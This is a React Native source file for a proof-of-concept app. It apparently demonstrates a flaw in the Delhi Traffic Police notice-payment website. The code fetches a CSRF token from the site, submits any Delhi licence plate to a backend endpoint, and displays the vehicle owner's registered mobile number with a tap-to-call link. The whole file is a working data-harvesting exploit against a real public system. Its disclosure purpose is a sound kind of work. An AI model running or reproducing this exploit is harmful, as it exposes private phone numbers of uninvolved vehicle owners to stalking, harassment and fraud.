import * as Linking from 'expo-linking';
import { StatusBar } from 'expo-status-bar';
import cheerio from 'cheerio';
import React, { useState } from 'react';
import { ActivityIndicator, StyleSheet, Text, TextInput, TouchableOpacity, View } from 'react-native';

export default function App() {
  const [error, setError] = useState(false);
  const [licensePlate, setLicensePlate] = useState('DL');
  const [loading, setLoading] = useState(false);
  const [mobileNumber, setMobileNumber] = useState('');
  const handleGetPhoneNumber = () => {
    setError('');
    setLoading(true);
    setMobileNumber('');
    if (!/^DL\d+[A-Z]{1,3}\d{4}$/.test(licensePlate)) {
      setError('The entered license plate number does not seem to be valid.');
      setLoading(false);
      return;
    }
    fetch('https://delhitrafficpolice.nic.in/notice/pay-notice/')
      .then(response => response.text())
      .then(html => {
        const $ = cheerio.load(html);
        const token = $('meta[name="csrf-token"]').attr('content');
        return fetch('https://delhitrafficpolice.nic.in/notice/pending-notice1', {
          method: 'POST',
          headers: {
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'X-CSRF-Token': token,
          },
          body: JSON.stringify({ vehicle_number: licensePlate }),
        })
        .then(response => response.json())
        .then(json => setMobileNumber(json.data.mobile_no));
      })
      .catch(() => setError('Failed to fetch phone number for specified license plate.'))
      .then(() => setLoading(false));
  };
  return (
    <View style={styles.container}>
      <Text style={{marginBottom: 20, width: '100%'}}>
        This app demonstrates the vulnerability in notice payment website of <Text style={styles.boldWeight}>Delhi Traffic Police</Text> yet to be addressed since over a year now.
      </Text>
      <View style={styles.textInputGroup}>
        <Text style={[styles.label, styles.boldWeight]}>License number</Text>
        <View style={styles.textInputContainer}>
          <TextInput
            autoFocus={true}
            defaultValue={licensePlate}
            onChangeText={input => setLicensePlate(input)}
            style={styles.textInput} />
        </View>
      </View>
      {loading ? (
        <Text style={{marginBottom: 20, width: '100%'}}>
          Trying to find registered mobile number for above license plate&hellip;
        </Text>
      ) : error ? (
        <Text style={{color: '#ff0000', marginBottom: 20, width: '100%'}}>{error}</Text>
      ) : mobileNumber ? (
        <Text style={{marginBottom: 20, width: '100%'}}>
          Found <Text style={styles.link} onPress={() => Linking.openURL(`tel:+91${mobileNumber}`)}>+91{mobileNumber}</Text> as registered mobile number. 
        </Text>
      ) : (
        <Text style={{marginBottom: 20, width: '100%'}}>
          Please enter your vehicle number and click below button.
        </Text>
      )}
      {loading ? (
        <View style={{justifyContent: 'center', height: 50}}>
          <ActivityIndicator />
        </View>
      ) : (
        <TouchableOpacity onPress={handleGetPhoneNumber} style={styles.button}>
          <Text style={styles.buttonText}>Get phone number</Text>
        </TouchableOpacity>
      )}
      <StatusBar style="auto" />
    </View>
  );
}

const styles = StyleSheet.create({
  button: {
    alignItems: 'center',
    backgroundColor: '#000',
    borderRadius: 25,
    height: 50,
    justifyContent: 'center',
    width: '75%',
  },
  boldWeight: {
    fontWeight: 'bold'
  },
  buttonText: {
    color: '#fff',
  },
  container: {
    alignItems: 'center',
    flex: 1,
    backgroundColor: '#fff',
    justifyContent: 'center',
    margin: 20,
  },
  label: {
    color: '#000',
    fontSize: 20,
    height: 20,
    marginBottom: 10,
  },
  link: {
    color: '#0000ff',
    textDecorationLine: 'underline',
  },
  textInput: {
    height: 50,
    textAlign: 'center',
    width: '100%',
  },
  textInputContainer: {
    alignItems: 'center',
    borderColor: 'gray',
    borderRadius: 30,
    borderWidth: 1,
    height: 50,
  },
  textInputGroup: {
    height: 80,
    marginBottom: 10,
    width: '100%',
  },
});
